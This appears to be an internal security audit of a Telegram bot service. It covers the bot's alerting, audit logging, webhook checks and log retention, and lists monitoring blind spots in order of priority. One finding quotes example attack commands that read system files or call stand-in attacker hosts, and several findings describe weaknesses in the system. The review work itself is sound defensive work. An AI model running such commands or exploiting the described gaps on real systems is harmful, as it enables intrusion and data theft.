# 19 — Abuse Detection & Monitoring Gaps

**Date:** 2026-05-14  
**Scope:** owner-alerts.ts, crashloop-watcher.ts, utils.ts (auditLog), alerts.ts, monitoring scripts, payment webhook, log retention, watchdog

---

## What IS monitored (coverage)

| Signal | Mechanism | Owner notified? |
|--------|-----------|----------------|
| Bot added to new chat | `my_chat_member` in index.ts | ✅ DM via `notifyOwnerDM` |
| Guest daemon crashloop (3x in 10 min) | `crashloop-watcher.ts` — polls /opt/vault every 30s | ✅ `notifyProblemChannel` + DM to guest |
| Container CPU >70% avg over 1 hour | `scripts/monitoring/cpu-monitor.sh` (systemd timer, 1 min interval) | ✅ `OWNER_PROBLEM_CHANNEL_ID` + DM to user |
| New paying user | `alertNewSubscriber()` in alerts.ts | ✅ DM to owner |
| Subscription expiring | `alertExpiringSubscription()` in alerts.ts | ✅ DM to owner |
| High free-user count | `alertHighFreeUserCount()` in alerts.ts | ✅ DM to owner (but NOT auto-triggered — no call site in production) |
| YooKassa webhook from non-allowed IP | `isYuKassaIp()` in dashboard-server.ts | ❌ `console.warn` only — no owner alert |
| All user messages | `auditLog()` in utils.ts | Written to file, NOT real-time alert |
| Auth events (authorized=true/false) | `auditLogAuth()` in utils.ts | Written to file, NOT real-time alert |
| Tool use (blocked or allowed) | `auditLogTool()` in utils.ts | Written to file, NOT real-time alert |
| Rate limit hit (owner token bucket) | `auditLogRateLimit()` in utils.ts | Written to file, NOT real-time alert |
| Errors in handlers | `auditLogError()` in utils.ts | Written to file, NOT real-time alert |
| Telegram 429 on sends | `streaming.ts` | `console.warn` only |
| DeepSeek pool empty | `session.ts:51` | `console.warn` only |

---

## Vector-by-vector findings

### 1. Suspicious commands in audit log — NO REAL-TIME ALERT
`cat /etc/passwd`, `wget evil.com`, `curl http://attacker.com` etc. go into `auditLogTool()` but there is **no pattern-matching on command content** and **no alert fires**. The owner would only see this if manually tailing the audit log. The security.ts `checkCommandSafety()` blocks some dangerous rm targets but does not pattern-match for recon commands, does not log to owner, and has no IDS logic.

### 2. Failed auth alert — PARTIAL (log only, no real-time push)
`auditLogAuth()` writes `authorized: false` to the flat file. **No `notifyProblemChannel` or `notifyOwnerDM` fires on unauthorized access.** An attacker probing with many userId guesses is invisible in real-time. The invite flow (`requestAccess`) does notify the owner when an unknown user hits `/start`, but raw messages from unknowns (text, photos, etc.) are silently dropped via `return next()` without any notification.

### 3. Daily billing spend per user — NO ALERT
`metering.ts` records token/cost to SQLite. There is **no threshold check, no daily rollup alert, no hook** that fires when a user exceeds e.g. $1/day. `alertHighFreeUserCount()` exists but has **no call site in production** — dead code effectively. The dashboard shows totals but is pull-only.

### 4. Resume hijack attempt — NOT DETECTABLE
`/resume` only calls `session.resumeSession(sessionId)` on the requesting user's own session object. There is no cross-user session-id validation — a user can only resume their own sessions because `getSession(userId)` is scoped by userId before the resume call. However, **no audit event is written for resume attempts**, and there is no check that the `session_id` in the callback actually came from the user's own session history (the session ID is in inline-keyboard callback data, which could be forged). No alert on abnormal resume patterns.

### 5. Container slot exhaustion — NO OWNER ALERT
`request-queue.ts` implements a semaphore (`MAX_CONCURRENT_CONTAINER_SESSIONS`, default 5). When all 5 slots are occupied, requests queue silently with a 60s timeout. **No `notifyProblemChannel` fires when the queue backs up or when the timeout hits.** Owner only learns of this from user complaints or manual log inspection.

### 6. DeepSeek rate-limit hit — NO ALERT
`session.ts:51` logs `console.warn` when the DeepSeek pool is empty. Actual HTTP 429s from `api.deepseek.com` are handled by grammY/fetch error paths but **no owner notification fires on repeated 429s**. The error surfaces to the user via `replyFriendly()` but owner stays blind.

### 7. Long voice (>5 minutes) — NO LIMIT, NO ALERT
`handleVoice()` has no duration or file-size check before calling `transcribeVoice()`. A 30-minute audio file would be passed to OpenAI Whisper, burning ~$0.18+ per file with no alert. No `console.warn`, no owner DM, no audit event beyond the standard `auditLog("VOICE", ...)`.

### 8. Repeated Telegram 429 — LOG ONLY
`streaming.ts` has explicit 429 handling in `IdleHeartbeat` (line 372) and text/tool deletion loops (lines 618, 635, 658) — all `console.warn`. **No escalation to `notifyProblemChannel`** even after repeated throttling that could indicate the bot is message-flooding.

### 9. Failed YooKassa webhook signature / IP — LOG ONLY
`handleYuKassaWebhookRoute()` checks IP via `isYuKassaIp()` and rejects non-allowed IPs with 403 + `console.warn`. **No `notifyProblemChannel` fires for rejected webhook attempts.** An attacker probing the webhook endpoint with fake payment events is invisible to the owner in real-time.

Note: there is **no HMAC signature verification** on the YooKassa webhook body — only IP allowlist. YooKassa supports webhook signatures (HMAC with a shared secret) but this is not implemented. The cross-API verification (`getPayment()` call after receipt) provides some defense-in-depth, but a fake payload with a valid Yookassa payment ID could exploit retry timing windows.

### 10. Honeypots — NONE
No canary files exist. No `/opt/claude-tg-bot/secret.env` or similar trap that would fire an alert if `cat`-ed by a guest. No inotifywait/auditd rule. Trivial to add: create a readable-but-worthless file, add an auditd rule on it, and pipe hits to `notifyProblemChannel`.

### 11. Log retention — WEAK
Logrotate config (in `scripts/bootstrap-proboi.sh`) rotates `/var/log/claude-tg-bot/*.log` **weekly, 4 rotations** = ~28 days of history. Audit log (`/var/log/claude-tg-bot.audit.log` in prod per CLAUDE.md, or `/tmp/claude-telegram-audit.log` if env not overridden) is **not in the logrotate config** — it grows unbounded. **No log shipping** to any external SIEM/analytics (no Loki, Datadog, Elastic, Papertrail, Logtail). Logs exist only on the prod host.

### 12. Audit log integrity — FRAGILE
`AUDIT_LOG_PATH` defaults to `/tmp/claude-telegram-audit.log`. `/tmp` is world-writable on most Linux systems. The bot runs as root on the prod server — meaning the audit log is writable by any process running as root. **No append-only flag** (`chattr +a`), no log signing, no checksums. A compromised guest container (if container escape occurs) cannot directly reach `/tmp` (container network/filesystem isolation), but the owner's own Claude Code session running on the same host can `rm` or overwrite the audit log trivially. Post-factum falsification is possible.

### 13. External watchdog — ABSENT
`/healthz` endpoint exists on the dashboard server (port 3848, `GET /healthz`). The health webhook on port 3847 requires `x-secret` auth and is push-only (receives POSTs, does not expose a poll endpoint). **No external uptime monitoring** (UptimeRobot, BetterUptime, Grafana Cloud, etc.) is configured in the repo. The systemd unit will restart the bot on crash, but a hung bot (alive but not polling) would go undetected. There is no periodic self-check that sends a heartbeat to an external service.

---

## Summary of blind spots (priority order)

| # | Gap | Impact | Ease to fix |
|---|-----|--------|------------|
| A | No alert on suspicious guest commands (recon) | High — active intrusion invisible | Medium (regex on auditLogTool content) |
| B | No alert on repeated unauthorized access probes | Medium — brute-force/enumeration invisible | Easy (counter + notifyProblemChannel in middleware) |
| C | No external watchdog polling /healthz | Medium — hung bot undetected | Easy (UptimeRobot free tier) |
| D | No per-user daily cost alert | Medium — surprise billing possible | Easy (metering query + threshold check) |
| E | Container slot exhaustion not alerted | Medium — silent degradation for all users | Easy (add warn in acquireContainerSlot) |
| F | YooKassa webhook IP rejection not alerted | Low-Medium — probing invisible | Easy (add notifyProblemChannel in handler) |
| G | No YooKassa HMAC body signature | Medium — replay/forge possible in theory | Medium (implement per YooKassa docs) |
| H | DeepSeek 429 not alerted | Low — owner misses key exhaustion | Easy (wrap in catch + notifyProblemChannel) |
| I | Audit log in /tmp, no append-only | Low (requires root escape) — falsification risk | Medium (chattr +a, move to /var/log) |
| J | No honeypot canary file | Low — opportunistic recon undetected | Easy (create file + auditd rule) |
| K | Audit log not shipped externally | Low — single point of failure for forensics | Medium (rsyslog → external) |
| L | Voice file no duration/size limit | Low — Whisper cost abuse | Easy (check voice.duration > 300s) |
| M | Log retention only 28 days | Low — forensic window limited | Easy (increase rotate count) |
| N | `alertHighFreeUserCount()` has no call site | Informational — dead code | Easy (add call in message middleware) |
